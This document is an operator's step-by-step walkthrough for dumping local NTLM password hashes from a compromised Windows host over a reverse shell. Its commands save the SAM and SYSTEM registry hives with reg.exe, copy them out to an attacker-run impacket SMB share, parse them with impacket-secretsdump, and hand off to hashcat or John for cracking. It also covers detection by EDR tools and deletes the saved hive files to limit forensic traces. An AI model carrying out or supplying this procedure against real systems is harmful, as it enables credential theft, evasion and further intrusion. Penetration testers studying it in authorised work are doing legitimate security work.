
**IMPORTANT: This walkthrough extracts local-account ==NTLM hashes== from a target where SYSTEM context has been achieved. The SAM and SYSTEM registry hives are saved on target using built-in `reg.exe`, transferred to the attacker, and parsed offline with `impacket-secretsdump`. Hashes are then cracked on the attacker. All preconditions must hold — verified in Step 1.**

- **SYSTEM context required on target.** Verified in Step 1 (Primary/Fallback pattern — see Section 0 of [[Windows Credential Extraction Checksheet]]). Local Administrator context is insufficient in most reverse-shell scenarios due to UAC handling of `SeBackupPrivilege`; SYSTEM bypasses this.
- **Local accounts only.** `impacket-secretsdump LOCAL` extracts NTLM hashes from the local SAM. Domain account hashes live in `NTDS.dit` on the Domain Controller — see [[NTDS.dit Extraction]].
- **Network egress from target to attacker.** Hive `.save` files must reach the attacker (SMB, HTTP, etc.). Hardened environments with egress filtering may require a pivot or alternative exfil path.
- **EDR / audit detection consideration.** No third-party binary touches the target (`reg.exe` is built-in; `.save` files have no malware signature). However, modern EDRs and Windows audit logs CAN detect `reg save HKLM\SAM` and `reg save HKLM\SYSTEM` as high-fidelity behavioural signals. Cleaner than Mimikatz-on-target — not invisible.
- **Hash cracking on attacker.** John or hashcat against extracted NTLM hashes — see [[Cracking Hashes]].

## Step 1 — Verify SYSTEM context

Primary: `set USERPROFILE` (type this do not copy and paste)

Fallback (this command may disconnect shell): `cmd.exe /c whoami`

- `USERPROFILE=C:\Windows\system32\config\systemprofile` (or `whoami` returns `nt authority\system`) → SYSTEM confirmed. Proceed to Step 2.
- Any other path / non-SYSTEM `whoami` → walkthrough cannot proceed. Return to [[Windows Credential Extraction Checksheet]].

## Step 2 — Save SAM and SYSTEM hives on target

`reg save HKLM\SAM C:\Windows\Temp\SAM.save /y`

`reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.save /y`

Verify both saves:

`dir C:\Windows\Temp\SAM.save C:\Windows\Temp\SYSTEM.save`

- Both files listed with non-zero size → proceed to Step 3.
- `Access is denied` on either save → SYSTEM context was lost. Return to Step 1.

## Step 3 — Transfer hives to attacker

### Attacker — start SMB receiver

In a dedicated terminal:

`mkdir -p /tmp/loot && sudo impacket-smbserver -smb2support share /tmp/loot`

Leave running.

### Target — push hives

In the reverse shell:

`copy C:\Windows\Temp\SAM.save \\<lhost>\share\`

`copy C:\Windows\Temp\SYSTEM.save \\<lhost>\share\`

Each should return `1 file(s) copied.`

### Attacker — verify transfer and stop receiver

`ls -la /tmp/loot/`

- Both files present, sizes match Step 2 `dir` output → `Ctrl+C` in SMB server terminal to stop the receiver. Continue.
- File sizes mismatch → re-run target `copy` commands (SMB server still running).
- `The network path was not found` on target `copy` → SMB egress blocked. Pivot to alternative exfil (out of canonical walkthrough scope).

### Attacker — take ownership of received files 

`sudo chown $USER:$USER /tmp/loot/*.save` 

⚠️ Without this, Step 4 fails `Permission denied` — sudo-run smbserver writes files as root.

## Step 4 — Parse hives on attacker

From the loot directory:

`cd /tmp/loot && impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL | tee ntlm_hashes.txt`

Expected output ends with `[*] Cleaning up...` and contains lines in the format `<user>:<rid>:<lm_hash>:<nt_hash>:::`.

- Hash lines present → proceed to Step 5.
-  `[-] [Errno 13] Permission denied: 'SYSTEM.save'`
- `[-] Error parsing` → check `ls -la /tmp/loot/`. File size mismatch with Step 2 `dir` output → re-run Step 3 (re-transfer). Sizes match → re-run Step 2 (re-save on target).
- No hash lines, no error → SAM contains no local users (unusual). Re-run Step 2 verification.
- `command not found: impacket-secretsdump` → `sudo apt install python3-impacket` on Kali.

## Step 5 — Cleanup on target

In the reverse shell:

`del C:\Windows\Temp\SAM.save`

`del C:\Windows\Temp\SYSTEM.save`

Verify deletion:

`dir C:\Windows\Temp\SAM.save C:\Windows\Temp\SYSTEM.save`

- `File Not Found` for both → cleanup complete. Proceed to Decision.
- Either file still listed → unexpected. Investigate manually (possible file lock by another process or SYSTEM context change since Step 2).

⚠️ `del` performs file unlink, not secure overwrite — `.save` content remains forensically recoverable until the disk sectors are reused. For engagements requiring forensic-resistant cleanup, the operator must escalate beyond this walkthrough.

## Decision

Hashes captured in `/tmp/loot/ntlm_hashes.txt`. 

**Hashes are of type NTLM.** 

Modes by tools, examples:

Hashcat: `-m 1000` 
John: `--format=NT`

Full tool usage: [[Cracking Hashes]].
